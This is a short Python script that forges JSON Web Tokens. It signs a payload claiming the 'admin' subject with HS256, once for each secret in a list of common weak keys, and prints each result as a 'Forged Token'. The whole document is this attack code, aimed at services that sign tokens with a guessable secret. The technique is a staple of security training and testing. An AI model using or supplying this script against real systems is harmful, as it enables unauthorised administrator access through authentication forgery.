import jwt

original_payload = {"sub": "admin", "exp": 1744304828}
wordlist = ["secret", "admin", "jwtkey", "password"]

for secret in wordlist:
    try:
        token = jwt.encode(original_payload, secret, algorithm="HS256")
        print(f"Forged Token with key '{secret}':", token)
    except Exception as e:
        print(f"Error with key '{secret}':", str(e))
        continue
        
